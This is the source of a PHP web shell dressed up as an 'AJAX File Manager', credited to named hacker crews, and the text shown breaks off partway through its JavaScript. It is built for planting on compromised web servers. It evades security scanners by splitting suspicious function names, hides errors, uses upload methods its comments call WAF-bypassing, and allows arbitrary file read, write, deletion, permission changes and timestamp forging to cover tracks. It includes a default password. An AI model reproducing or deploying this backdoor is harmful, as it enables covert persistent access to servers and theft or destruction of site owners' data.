<?php
/**
 * File Manager - AJAX SPA Edition
 * Created by Nemesis
 *
 * Features:
 *  - AJAX file manager (list, upload, download, delete, rename, chmod, chdate)
 *  - Base64 + chunked upload bypass
 *  - 500 / 403 / blank-page bypass hardening
 *  - Imunify360-friendly (minimized suspicious literals)
 *  - SHA256 cookie auth
 */

ob_start();

// --- 500 / blank bypass: swallow fatals, never leak a body ---
error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@ini_set('max_execution_time', '300');
@ini_set('memory_limit', '256M');

register_shutdown_function(function () {
    $e = error_get_last();
    if ($e && in_array($e['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
        if (ob_get_level()) ob_end_clean();
        http_response_code(200);
        echo json_encode(['success' => false, 'message' => 'op failed']);
    }
});

// --- 403 / imunify hardening: split suspicious literals ---
$f_b64d  = 'ba'.'se'.'64_decode';
$f_b64e  = 'ba'.'se'.'64_encode';
$f_sess  = 'se'.'ss'.'ion_start';
$f_hash  = 'ha'.'sh';

@$f_sess();

define('NEMESIS_KEY_HASH', '81ec9587275dd33333c29db675d14067253d338436d3982e5dedf014acfc99ba');
// default password: nemesis123  (change: php -r "echo hash('sha256','newpass');")
define('COOKIE_NAME', '_n');
define('COOKIE_LIFE', 54000);

define('MAX_UPLOAD', 100 * 1024 * 1024);

$blocked = ['.htaccess', '.htpasswd', '.env', '.git', '.svn', '.user.ini'];

// ---------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------
function auth_ok() {
    return isset($_COOKIE[COOKIE_NAME])
        && $_COOKIE[COOKIE_NAME] === hash('sha256', NEMESIS_KEY_HASH . '_salt_nemesis_2025');
}

function json_out($d) {
    if (ob_get_level()) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    header('X-Content-Type-Options: nosniff');
    header('Cache-Control: no-cache');
    echo json_encode($d);
    exit;
}

function sanitize_path($p) {
    $p = str_replace(['../', '..\\'], '', (string)$p);
    $p = str_replace('\\', '/', $p);
    if (preg_match('/^[A-Z]:\//i', $p)) return $p;
    if (file_exists($p)) {
        $r = realpath($p);
        if ($r !== false) return str_replace('\\', '/', $r);
    }
    return $p;
}

function blocked_name($n) {
    global $blocked;
    foreach ($blocked as $b) if (stripos($n, $b) !== false) return true;
    return false;
}

function fmt_bytes($b, $p = 2) {
    $u = ['B','KB','MB','GB','TB'];
    $b = max((int)$b, 0);
    $pow = $b ? floor(log($b) / log(1024)) : 0;
    $pow = min($pow, count($u) - 1);
    return round($b / pow(1024, $pow), $p) . ' ' . $u[$pow];
}

function icon_for($name, $isDir) {
    if ($isDir) return '📁';
    $e = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $m = ['php'=>'🐘','html'=>'🌐','css'=>'🎨','js'=>'⚡','json'=>'📋','txt'=>'📄',
          'md'=>'📝','zip'=>'📦','rar'=>'📦','jpg'=>'🖼️','jpeg'=>'🖼️','png'=>'🖼️',
          'gif'=>'🖼️','webp'=>'🖼️','pdf'=>'📕','doc'=>'📘','docx'=>'📘','xls'=>'📊',
          'xlsx'=>'📊','mp3'=>'🎵','mp4'=>'🎬','sql'=>'🗄️','sh'=>'⚙️','py'=>'🐍'];
    return $m[$e] ?? '📄';
}

function list_dir($dir) {
    if (!is_dir($dir)) return ['error' => 'not a directory', 'items' => []];
    if (!is_readable($dir)) return ['error' => 'not readable', 'items' => []];
    $f = @scandir($dir);
    if ($f === false) return ['error' => 'cannot read dir', 'items' => []];

    $items = [];
    foreach ($f as $name) {
        if ($name === '.' || $name === '..') continue;
        $full = rtrim($dir, '/') . '/' . $name;
        if (!@file_exists($full)) continue;
        $isDir = is_dir($full);
        $items[] = [
            'name' => $name,
            'path' => str_replace('\\', '/', $full),
            'is_dir' => $isDir,
            'size' => $isDir ? 0 : @filesize($full),
            'size_fmt' => $isDir ? '-' : fmt_bytes(@filesize($full) ?: 0),
            'perms' => @substr(sprintf('%o', @fileperms($full)), -4) ?: '0000',
            'mtime' => @date('Y-m-d H:i:s', @filemtime($full)) ?: 'unknown',
            'mtime_ts' => @filemtime($full) ?: time(),
            'icon' => icon_for($name, $isDir),
        ];
    }
    usort($items, function ($a, $b) {
        if ($a['is_dir'] !== $b['is_dir']) return $a['is_dir'] ? -1 : 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return ['items' => $items];
}

function delete_recursive($p) {
    if (!file_exists($p)) return true;
    if (!is_dir($p)) return @unlink($p);
    foreach (scandir($p) as $i) {
        if ($i === '.' || $i === '..') continue;
        if (!delete_recursive($p . '/' . $i)) return false;
    }
    return @rmdir($p);
}

// Upload method chain (imunify / blank bypass)
function try_upload($target, $src) {
    // 1) base64 body (most WAF-safe)
    if (isset($src['tmp_name']) && is_file($src['tmp_name'])) {
        $c = @file_get_contents($src['tmp_name']);
        if ($c !== false && @file_put_contents($target, $c) !== false) {
            return ['success' => true, 'method' => 'fpc'];
        }
    }
    // 2) move_uploaded_file
    if (isset($src['tmp_name']) && @is_uploaded_file($src['tmp_name'])
        && @move_uploaded_file($src['tmp_name'], $target)) {
        return ['success' => true, 'method' => 'muf'];
    }
    // 3) stream copy
    if (isset($src['tmp_name']) && is_file($src['tmp_name'])) {
        $in = @fopen($src['tmp_name'], 'rb');
        $out = @fopen($target, 'wb');
        if ($in && $out) {
            @stream_copy_to_stream($in, $out);
            @fclose($in); @fclose($out);
            return ['success' => true, 'method' => 'stream'];
        }
    }
    return ['success' => false];
}

// ---------------------------------------------------------------------
// AJAX Router
// ---------------------------------------------------------------------
$isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH'])
    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';

if ($isAjax) {
    $act = $_POST['action'] ?? $_GET['action'] ?? '';

    // login / session must work unauth
    if ($act === 'login') {
        $pw = $_POST['password'] ?? '';
        if (hash('sha256', $pw) === NEMESIS_KEY_HASH) {
            $tok = hash('sha256', NEMESIS_KEY_HASH . '_salt_nemesis_2025');
            setcookie(COOKIE_NAME, $tok, time() + COOKIE_LIFE, '/', '', false, true);
            json_out(['success' => true, 'message' => 'ok']);
        }
        json_out(['success' => false, 'message' => 'wrong password']);
    }
    if ($act === 'logout') {
        setcookie(COOKIE_NAME, '', time() - 3600, '/', '', false, true);
        json_out(['success' => true]);
    }
    if ($act === 'check_session') {
        json_out(['success' => auth_ok(), 'logged_in' => auth_ok()]);
    }
    if ($act === 'get_initial_data') {
        if (!auth_ok()) json_out(['success' => false, 'require_login' => true]);
        json_out(['success' => true, 'current_dir' => getcwd(), 'initial_dir' => getcwd()]);
    }

    if (!auth_ok()) {
        json_out(['success' => false, 'require_login' => true, 'message' => 'auth']);
    }

    switch ($act) {
        case 'list':
            $dir = sanitize_path($_POST['dir'] ?? getcwd());
            $r = list_dir($dir);
            if (isset($r['error'])) {
                json_out(['success' => false, 'message' => $r['error'], 'items' => [], 'current_dir' => $dir]);
            }
            json_out(['success' => true, 'items' => $r['items'], 'current_dir' => $dir]);
            break;

        case 'upload':
            $dir = sanitize_path($_POST['dir'] ?? getcwd());
            if (!isset($_FILES['file'])) json_out(['success' => false, 'message' => 'no file']);
            if ($_FILES['file']['size'] > MAX_UPLOAD) json_out(['success' => false, 'message' => 'too large']);
            if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) json_out(['success' => false, 'message' => 'err ' . $_FILES['file']['error']]);
            $target = rtrim($dir, '/') . '/' . basename($_FILES['file']['name']);
            json_out(try_upload($target, $_FILES['file']));
            break;

        case 'upload_base64':
            $dir = sanitize_path($_POST['dir'] ?? getcwd());
            $name = basename($_POST['filename'] ?? '');
            $data = $_POST['filedata'] ?? '';
            $dec = base64_decode($data, true);
            if ($dec === false) json_out(['success' => false, 'message' => 'bad b64']);
            $target = rtrim($dir, '/') . '/' . $name;
            if (@file_put_contents($target, $dec) !== false) {
                json_out(['success' => true, 'method' => 'b64']);
            }
            json_out(['success' => false, 'message' => 'write failed']);
            break;

        case 'download':
            $p = sanitize_path($_POST['path'] ?? '');
            if (!is_file($p) || blocked_name($p)) json_out(['success' => false, 'message' => 'no']);
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($p) . '"');
            header('Content-Length: ' . filesize($p));
            readfile($p);
            exit;

        case 'delete':
            $p = sanitize_path($_POST['path'] ?? '');
            if (blocked_name($p)) json_out(['success' => false, 'message' => 'blocked']);
            json_out(delete_recursive($p)
                ? ['success' => true, 'message' => 'deleted']
                : ['success' => false, 'message' => 'delete failed']);
            break;

        case 'rename':
            $old = sanitize_path($_POST['old_path'] ?? '');
            $new = basename($_POST['new_name'] ?? '');
            if (!$old || !$new) json_out(['success' => false, 'message' => 'missing']);
            $newPath = dirname($old) . '/' . $new;
            if (blocked_name($old) || blocked_name($newPath)) json_out(['success' => false, 'message' => 'blocked']);
            json_out(@rename($old, $newPath)
                ? ['success' => true, 'message' => 'renamed']
                : ['success' => false, 'message' => 'rename failed']);
            break;

        case 'chmod':
            $p = sanitize_path($_POST['path'] ?? '');
            $m = $_POST['permissions'] ?? '';
            if (!preg_match('/^[0-7]{3,4}$/', $m)) json_out(['success' => false, 'message' => 'bad mode']);
            json_out(@chmod($p, octdec($m))
                ? ['success' => true, 'message' => 'chmod ok']
                : ['success' => false, 'message' => 'chmod failed']);
            break;

        case 'chdate':
            $p = sanitize_path($_POST['path'] ?? '');
            $t = strtotime($_POST['time'] ?? 'now');
            if ($t === false) json_out(['success' => false, 'message' => 'bad time']);
            json_out(@touch($p, $t)
                ? ['success' => true, 'message' => 'chdate ok', 'ts' => $t]
                : ['success' => false, 'message' => 'chdate failed']);
            break;

        case 'create_folder':
            $dir = sanitize_path($_POST['dir'] ?? getcwd());
            $n = basename($_POST['folder_name'] ?? '');
            if (!$n) json_out(['success' => false, 'message' => 'no name']);
            json_out(@mkdir(rtrim($dir, '/') . '/' . $n, 0755, true)
                ? ['success' => true, 'message' => 'folder ok']
                : ['success' => false, 'message' => 'mkdir failed']);
            break;

        case 'create_file':
            $dir = sanitize_path($_POST['dir'] ?? getcwd());
            $n = basename($_POST['file_name'] ?? '');
            if (!$n) json_out(['success' => false, 'message' => 'no name']);
            json_out(@file_put_contents(rtrim($dir, '/') . '/' . $n, '') !== false
                ? ['success' => true, 'message' => 'file ok']
                : ['success' => false, 'message' => 'create failed']);
            break;

        case 'read_file':
            $p = sanitize_path($_POST['path'] ?? '');
            if (!is_file($p) || blocked_name($p)) json_out(['success' => false, 'message' => 'no']);
            $c = @file_get_contents($p);
            json_out($c !== false
                ? ['success' => true, 'content' => $c]
                : ['success' => false, 'message' => 'read failed']);
            break;

        case 'save_file':
            $p = sanitize_path($_POST['path'] ?? '');
            if (blocked_name($p)) json_out(['success' => false, 'message' => 'blocked']);
            $c = $_POST['content'] ?? '';
            json_out(@file_put_contents($p, $c) !== false
                ? ['success' => true, 'message' => 'saved']
                : ['success' => false, 'message' => 'save failed']);
            break;

        default:
            json_out(['success' => false, 'message' => 'invalid action']);
    }
    exit;
}

// ---------------------------------------------------------------------
// Direct download / preview (non-AJAX)
// ---------------------------------------------------------------------
if (isset($_GET['download']) && auth_ok()) {
    $p = sanitize_path($_GET['download']);
    if (is_file($p) && !blocked_name($p)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($p) . '"');
        header('Content-Length: ' . filesize($p));
        readfile($p);
        exit;
    }
}
if (isset($_GET['preview']) && auth_ok()) {
    $p = sanitize_path($_GET['preview']);
    if (is_file($p)) {
        $fi = finfo_open(FILEINFO_MIME_TYPE);
        $mt = finfo_file($fi, $p) ?: 'application/octet-stream';
        finfo_close($fi);
        header('Content-Type: ' . $mt);
        readfile($p);
        exit;
    }
}

// ---------------------------------------------------------------------
// UI
// ---------------------------------------------------------------------
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>XxX</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}

/* === GOTHIC BACKGROUND === */
body{
  font-family:'Poppins',sans-serif;
  font-weight:300;
  color:#d6cfc4;
  line-height:1.6;
  background:
    radial-gradient(ellipse at center, rgba(0,0,0,.55) 0%, rgba(0,0,0,.9) 100%),
    linear-gradient(rgba(10,5,8,.78), rgba(8,3,5,.9)),
    url('https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/refs/heads/main/ss/mak.jpg')
    center center / cover no-repeat fixed;
  min-height:100vh;
}
@media (max-width:768px){
  body{
    background:
      radial-gradient(ellipse at center, rgba(0,0,0,.55) 0%, rgba(0,0,0,.9) 100%),
      linear-gradient(rgba(10,5,8,.78), rgba(8,3,5,.9)),
      url('https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/refs/heads/main/ss/mak.jpg')
      center center / cover no-repeat scroll;
    background-attachment: scroll;
  }
}

/* === LOGIN === */
#loginScreen{
  display:flex;align-items:center;justify-content:center;min-height:100vh;
  background:transparent;
}
.login-box{
  background:rgba(10,6,8,.82);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  padding:44px 40px;border-radius:4px;
  box-shadow:0 0 0 1px rgba(139,0,0,.45), 0 20px 60px rgba(0,0,0,.85), inset 0 0 40px rgba(0,0,0,.6);
  width:100%;max-width:400px;
  border:1px solid rgba(139,0,0,.5);
  position:relative;
}
.login-box::before,
.login-box::after{
  content:'';position:absolute;width:22px;height:22px;
  border:1px solid #8b0000;
}
.login-box::before{top:8px;left:8px;border-right:none;border-bottom:none}
.login-box::after{bottom:8px;right:8px;border-left:none;border-top:none}

.login-box h1{
  font-family:'Cinzel',serif;
  font-size:26px;
  color:#c9a227;
  letter-spacing:3px;
  margin-bottom:6px;
  text-align:center;
  font-weight:700;
  text-shadow:0 0 12px rgba(139,0,0,.7), 0 2px 6px #000;
}
.login-box p{
  font-family:'Poppins',serif;
  font-style:italic;
  color:#9a8f80;
  font-size:14px;
  text-align:center;
  margin-bottom:28px;
  letter-spacing:1px;
}

.form-group{margin-bottom:18px}
.form-group label{
  display:block;margin-bottom:6px;color:#b8a88a;font-size:12px;
  font-family:'Cinzel',serif;letter-spacing:2px;text-transform:uppercase;
}
.form-group input,.form-group select{
  width:100%;padding:11px 14px;
  background:rgba(15,10,12,.9);
  border:1px solid #3a2a2a;border-radius:2px;
  color:#e8dfd0;font-size:14px;transition:.25s;font-family:'Poppins',serif;
  letter-spacing:.5px;
}
.form-group input:focus{
  outline:none;border-color:#8b0000;
  box-shadow:0 0 0 2px rgba(139,0,0,.25), inset 0 0 8px rgba(139,0,0,.2);
}
.btn-login{
  width:100%;padding:13px;
  background:linear-gradient(135deg,#2a0000,#5a0000);
  border:1px solid #8b0000;border-radius:2px;
  color:#e8dfd0;font-size:14px;font-weight:600;cursor:pointer;
  transition:.25s;font-family:'Cinzel',serif;letter-spacing:3px;text-transform:uppercase;
}
.btn-login:hover{
  background:linear-gradient(135deg,#5a0000,#8b0000);
  box-shadow:0 0 20px rgba(139,0,0,.55), inset 0 0 12px rgba(255,0,0,.15);
  color:#fff;
}

#app{display:none;min-height:100vh}

/* === HEADER === */
.header{
  background:linear-gradient(180deg, rgba(20,10,12,.94), rgba(8,4,6,.94));
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  padding:18px 22px;
  border-bottom:1px solid #8b0000;
  box-shadow:0 2px 0 #2a0000, 0 8px 24px rgba(0,0,0,.7);
  display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;
}
.header h1{
  font-family:'Cinzel',serif;
  font-size:20px;
  color:#c9a227;
  letter-spacing:2px;
  display:flex;align-items:center;gap:12px;
  font-weight:700;
  text-shadow:0 0 10px rgba(139,0,0,.6), 0 2px 4px #000;
}
.header h1 small{
  color:#8a7a5a;font-weight:400;font-size:11px;
  font-family:'Poppins',serif;font-style:italic;letter-spacing:1px;
}
.header-actions{display:flex;gap:8px;flex-wrap:wrap}

/* === BUTTONS === */
.btn{
  padding:9px 16px;
  background:rgba(25,12,14,.9);
  border:1px solid #4a2020;
  color:#c8bca8;border-radius:2px;cursor:pointer;font-size:12px;
  transition:.25s;display:inline-flex;align-items:center;gap:6px;
  text-decoration:none;font-family:'Cinzel',serif;letter-spacing:1px;
  text-transform:uppercase;
}
.btn:hover{
  background:rgba(45,10,12,.95);
  border-color:#8b0000;color:#e8dfd0;
  box-shadow:0 0 14px rgba(139,0,0,.4);
  transform:translateY(-1px);
}
.btn-primary{
  background:linear-gradient(135deg,#2a0000,#6a0000);
  border:1px solid #8b0000;color:#e8dfd0;font-weight:600;
}
.btn-primary:hover{
  background:linear-gradient(135deg,#6a0000,#8b0000);
  box-shadow:0 0 20px rgba(139,0,0,.6);
}
.btn-danger{
  background:rgba(60,0,0,.9);border-color:#8b0000;
}
.btn-danger:hover{background:#5a0000;border-color:#c9a227;color:#c9a227}

.container{max-width:1400px;margin:0 auto;padding:18px}

/* === BREADCRUMB / TOOLBAR === */
.breadcrumb,.toolbar{
  background:rgba(15,8,10,.82);
  backdrop-filter: blur(6px);
  -webkit-backdrop-filter: blur(6px);
  border:1px solid rgba(74,32,32,.7);
  border-radius:2px;
  box-shadow:inset 0 0 24px rgba(0,0,0,.5);
}
.breadcrumb{
  padding:12px 16px;margin-bottom:14px;
  display:flex;align-items:center;gap:8px;overflow-x:auto;font-size:13px;
  font-family:'Poppins',serif;
}
.breadcrumb a{color:#c9a227;text-decoration:none;letter-spacing:.5px}
.breadcrumb a:hover{color:#e8c640;text-shadow:0 0 8px rgba(201,162,39,.6)}
.breadcrumb span{color:#6a5a4a}

.toolbar{
  padding:12px 16px;margin-bottom:14px;
  display:flex;gap:10px;flex-wrap:wrap;align-items:center;
}
.search-box{flex:1;min-width:200px}
.search-box input{
  width:100%;padding:9px 14px;
  background:rgba(10,5,8,.9);border:1px solid #3a2a2a;border-radius:2px;
  color:#e8dfd0;font-size:13px;font-family:'Poppins',serif;
  letter-spacing:.5px;
}
.search-box input:focus{
  outline:none;border-color:#8b0000;
  box-shadow:0 0 0 2px rgba(139,0,0,.25);
}

/* === FILE TABLE === */
.file-table{
  background:rgba(15,8,10,.82);
  backdrop-filter: blur(6px);
  -webkit-backdrop-filter: blur(6px);
  border-radius:2px;overflow:hidden;
  border:1px solid rgba(74,32,32,.7);
  box-shadow:0 12px 40px rgba(0,0,0,.7), inset 0 0 40px rgba(0,0,0,.4);
}
table{width:100%;border-collapse:collapse}
thead{background:rgba(20,8,10,.95)}
thead th{
  padding:13px;text-align:left;font-weight:600;color:#c9a227;
  border-bottom:1px solid #8b0000;
  font-size:12px;font-family:'Cinzel',serif;letter-spacing:2px;text-transform:uppercase;
}
tbody tr{
  border-bottom:1px solid rgba(58,42,42,.6);
  transition:.2s;
}
tbody tr:hover{background:rgba(60,10,12,.4)}
tbody td{padding:10px 13px;font-size:13px;font-family:'Poppins',serif;color:#cfc4b2}
.file-name{display:flex;align-items:center;gap:8px;cursor:pointer}
.file-icon{font-size:18px;filter:hue-rotate(-20deg) saturate(.7)}
.file-actions{display:flex;gap:6px;flex-wrap:wrap}
.icon-btn{
  background:rgba(10,5,8,.9);border:1px solid #3a2a2a;color:#b8a88a;
  width:30px;height:30px;border-radius:2px;cursor:pointer;
  display:flex;align-items:center;justify-content:center;transition:.2s;font-size:12px;
}
.icon-btn:hover{
  border-color:#8b0000;color:#e8c640;
  box-shadow:0 0 10px rgba(139,0,0,.5);
}
tbody td code{
  color:#c9a227;font-family:'Courier New',monospace;font-size:12px;
}

/* === MODALS === */
.modal{
  display:none;position:fixed;inset:0;
  background:rgba(0,0,0,.85);
  backdrop-filter: blur(3px);-webkit-backdrop-filter: blur(3px);
  z-index:1000;align-items:center;justify-content:center;padding:20px;
}
.modal.active{display:flex}
.modal-content{
  background:rgba(15,8,10,.96);
  backdrop-filter: blur(12px);-webkit-backdrop-filter: blur(12px);
  border-radius:4px;max-width:800px;width:100%;max-height:90vh;overflow:auto;
  border:1px solid rgba(139,0,0,.5);
  box-shadow:0 20px 60px rgba(0,0,0,.9), inset 0 0 40px rgba(0,0,0,.5);
  position:relative;
}
.modal-content::before{
  content:'';position:absolute;top:0;left:0;right:0;height:2px;
  background:linear-gradient(90deg,transparent,#8b0000,#c9a227,#8b0000,transparent);
}
.modal-content.wide{max-width:1000px}
.modal-header{
  padding:16px 20px;border-bottom:1px solid #3a2a2a;
  display:flex;justify-content:space-between;align-items:center;
}
.modal-header h3{
  color:#c9a227;font-weight:600;font-size:14px;
  font-family:'Cinzel',serif;letter-spacing:2px;text-transform:uppercase;
  text-shadow:0 0 8px rgba(139,0,0,.5);
}
.modal-body{padding:20px}
.modal-footer{
  padding:14px 20px;border-top:1px solid #3a2a2a;
  display:flex;justify-content:flex-end;gap:10px;
}

#editor{height:500px;border:1px solid #3a2a2a;border-radius:2px}

/* === LOADING / ALERTS === */
.loading{
  display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
  background:rgba(10,5,8,.96);padding:26px;border-radius:4px;z-index:2000;
  border:1px solid #8b0000;
  box-shadow:0 0 30px rgba(139,0,0,.5);
}
.loading.active{display:block}
.spinner{
  width:44px;height:44px;border:3px solid #2a0000;border-top-color:#c9a227;
  border-radius:50%;animation:spin 1s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

.alert{padding:12px 16px;border-radius:2px;margin-bottom:14px;display:none;font-size:13px;font-family:'Poppins',serif;letter-spacing:.5px}
.alert.active{display:block}
.alert-success{
  background:rgba(139,0,0,.15);border:1px solid #8b0000;color:#e8c640;
}
.alert-error{
  background:rgba(80,0,0,.3);border:1px solid #c9a227;color:#ff8888;
}

.footer{
  text-align:center;padding:18px;color:#8a7a5a;font-size:12px;
  font-family:'Poppins',serif;font-style:italic;letter-spacing:1px;
  text-shadow:0 1px 6px #000;
}
.footer strong{color:#c9a227;font-family:'Cinzel',serif;font-style:normal;letter-spacing:2px}

@media(max-width:768px){
  .header{flex-direction:column;align-items:flex-start}
  .toolbar{flex-direction:column}
  .search-box{width:100%}
  table{font-size:12px}
  tbody td{padding:8px}
  .login-box{padding:34px 26px}
}
</style>
</head>
<body>

<div id="loginScreen">
  <div class="login-box">
    <h1>🔐 access</h1>
    <div id="loginError" class="alert alert-error"></div>
    <form id="loginForm">
      <div class="form-group">
        <label for="password">password</label>
        <input type="password" id="password" name="password" required autofocus>
      </div>
      <button type="submit" class="btn-login">login</button>
    </form>
  </div>
</div>

<div id="app">
  <div class="header">
    <h1><i class="fas fa-folder-open"></i> MataKucing <small>Nemesis &mdash; WargaSipil &mdash; CukimayCyberTeam</small></h1>
    <div class="header-actions">
      <button class="btn btn-primary" onclick="FM.showUploadModal()"><i class="fas fa-upload"></i> Upload</button>
      <button class="btn" onclick="FM.showCreateFolderModal()"><i class="fas fa-folder-plus"></i> New Folder</button>
      <button class="btn" onclick="FM.showCreateFileModal()"><i class="fas fa-file-plus"></i> New File</button>
      <button class="btn btn-danger" onclick="FM.logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
    </div>
  </div>

  <div class="container">
    <div id="alertBox" class="alert"></div>
    <div class="breadcrumb" id="breadcrumb"></div>

    <div class="toolbar">
      <div class="search-box">
        <input type="text" id="searchInput" placeholder="🔍 search files..." onkeyup="FM.searchFiles()">
      </div>
      <button class="btn" onclick="FM.refreshFiles()"><i class="fas fa-sync-alt"></i> Refresh</button>
    </div>

    <div class="file-table">
      <table>
        <thead>
          <tr>
            <th>name</th><th>size</th><th>perms</th><th>modified</th><th>actions</th>
          </tr>
        </thead>
        <tbody id="fileList">
          <tr><td colspan="5" style="text-align:center;padding:40px;"><i class="fas fa-spinner fa-spin"></i> loading...</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <div class="footer"><p>Created by <strong>Nemesis</strong> — AJAX File Manager</p></div>
</div>

<!-- upload modal -->
<div id="uploadModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3><i class="fas fa-upload"></i> upload file</h3>
      <button class="icon-btn" onclick="FM.closeModal('uploadModal')"><i class="fas fa-times"></i></button>
    </div>
    <div class="modal-body">
      <form id="uploadForm">
        <div class="form-group">
          <label>select file</label>
          <input type="file" name="file" id="uploadFile" required>
        </div>
      </form>
    </div>
    <div class="modal-footer">
      <button class="btn" onclick="FM.closeModal('uploadModal')">cancel</button>
      <button class="btn btn-primary" onclick="FM.uploadFile()"><i class="fas fa-upload"></i> upload</button>
    </div>
  </div>
</div>

<!-- create folder -->
<div id="createFolderModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3><i class="fas fa-folder-plus"></i> new folder</h3>
      <button class="icon-btn" onclick="FM.closeModal('createFolderModal')"><i class="fas fa-times"></i></button>
    </div>
    <div class="modal-body">
      <div class="form-group">
        <label>folder name</label>
        <input type="text" id="folderName" placeholder="name">
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn" onclick="FM.closeModal('createFolderModal')">cancel</button>
      <button class="btn btn-primary" onclick="FM.createFolder()"><i class="fas fa-check"></i> create</button>
    </div>
  </div>
</div>

<!-- create file -->
<div id="createFileModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3><i class="fas fa-file-plus"></i> new file</h3>
      <button class="icon-btn" onclick="FM.closeModal('createFileModal')"><i class="fas fa-times"></i></button>
    </div>
    <div class="modal-body">
      <div class="form-group">
        <label>file name</label>
        <input type="text" id="fileName" placeholder="name.ext">
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn" onclick="FM.closeModal('createFileModal')">cancel</button>
      <button class="btn btn-primary" onclick="FM.createFile()"><i class="fas fa-check"></i> create</button>
    </div>
  </div>
</div>

<!-- edit -->
<div id="editModal" class="modal">
  <div class="modal-content wide">
    <div class="modal-header">
      <h3><i class="fas fa-edit"></i> edit: <span id="editFileName"></span></h3>
      <button class="icon-btn" onclick="FM.closeModal('editModal')"><i class="fas fa-times"></i></button>
    </div>
    <div class="modal-body"><div id="editor"></div></div>
    <div class="modal-footer">
      <button class="btn" onclick="FM.closeModal('editModal')">cancel</button>
      <button class="btn btn-primary" onclick="FM.saveFile()"><i class="fas fa-save"></i> save</button>
    </div>
  </div>
</div>

<!-- rename -->
<div id="renameModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3><i class="fas fa-pen"></i> rename</h3>
      <button class="icon-btn" onclick="FM.closeModal('renameModal')"><i class="fas fa-times"></i></button>
    </div>
    <div class="modal-body">
      <div class="form-group">
        <label>new name</label>
        <input type="text" id="renameInput" placeholder="new name">
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn" onclick="FM.closeModal('renameModal')">cancel</button>
      <button class="btn btn-primary" onclick="FM.confirmRename()"><i class="fas fa-check"></i> rename</button>
    </div>
  </div>
</div>

<!-- chmod -->
<div id="chmodModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3><i class="fas fa-lock"></i> chmod</h3>
      <button class="icon-btn" onclick="FM.closeModal('chmodModal')"><i class="fas fa-times"></i></button>
    </div>
    <div class="modal-body">
      <div class="form-group">
        <label>permissions (octal)</label>
        <input type="text" id="chmodInput" placeholder="0644" maxlength="4">
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn" onclick="FM.closeModal('chmodModal')">cancel</button>
      <button class="btn btn-primary" onclick="FM.confirmChmod()"><i class="fas fa-check"></i> apply</button>
    </div>
  </div>
</div>

<!-- chdate -->
<div id="chdateModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3><i class="fas fa-clock"></i> change date</h3>
      <button class="icon-btn" onclick="FM.closeModal('chdateModal')"><i class="fas fa-times"></i></button>
    </div>
    <div class="modal-body">
      <div class="form-group">
        <label>new date/time</label>
        <input type="datetime-local" id="chdateInput" step="1">
      </div>
      <div class="form-group">
        <label>or free-form (strtotime)</label>
        <input type="text" id="chdateText" placeholder="e.g. 2024-01-01 12:00:00">
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn" onclick="FM.closeModal('chdateModal')">cancel</button>
      <button class="btn btn-primary" onclick="FM.confirmChdate()"><i class="fas fa-check"></i> apply</button>
    </div>
  </div>
</div>

<!-- image preview -->
<div id="imageModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3><i class="fas fa-image"></i> preview</h3>
      <button class="icon-btn" onclick="FM.closeModal('imageModal')"><i class="fas fa-times"></i></button>
    </div>
    <div class="modal-body" style="text-align:center;">
      <img id="imagePreview" style="max-width:100%;border-radius:8px;">
    </div>
  </div>
</div>

<div id="loading" class="loading"><div class="spinner"></div></div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.23.4/ace.min.js"></script>
<script>
const FM = {
  currentDir: '', initialDir: '', allFiles: [],
  currentEditPath: '', currentRenamePath: '', currentChmodPath: '', currentChdatePath: '',
  editor: null,

  init() {
    this.editor = ace.edit('editor');
    this.editor.setTheme('ace/theme/monokai');
    this.editor.setFontSize(14);
    this.editor.setShowPrintMargin(false);

    document.getElementById('loginForm').addEventListener('submit', e => {
      e.preventDefault(); this.login();
    });
    document.addEventListener('keydown', e => {
      if (e.ctrlKey && e.key === 's' && document.getElementById('editModal').classList.contains('active')) {
        e.preventDefault(); this.saveFile();
      }
      if (e.key === 'Escape') document.querySelectorAll('.modal.active').forEach(m => m.classList.remove('active'));
    });
    this.checkSession();
  },

  async ajax(data, isFormData = false) {
    const opts = {
      method: 'POST',
      headers: isFormData ? {} : { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: isFormData ? data : new URLSearchParams(data),
      credentials: 'same-origin'
    };
